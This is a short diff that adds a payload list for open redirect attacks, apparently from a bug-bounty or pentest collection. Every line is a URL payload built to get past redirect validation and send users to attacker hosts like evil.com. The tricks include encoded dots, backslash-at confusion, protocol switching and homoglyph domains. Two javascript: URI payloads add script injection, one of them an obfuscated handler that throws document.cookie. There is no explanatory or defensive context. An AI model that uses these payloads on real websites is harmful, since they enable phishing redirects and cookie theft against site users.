@@ -1,1 +1,18 @@
+## Open Redirect Payload:
+
+# poc: redirect_to=////evil%E3%80%82com
+# http://example.com -> ftp://example.com
+# https://hacker.com\@example.com
+# http://evil(.)com
+# http%3A%2F%2Fevil(.)com
+# //evil,org
+# eevil[.]cOm
+# example.com/.evil.com
+# Bypass Payload : https://redacted(.)com/@evil(.)com
+# javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+#  javascript​:alert(1);
+//Evil. com
+////evil%E3%80%82com
+google.comğ.target.com
+
 
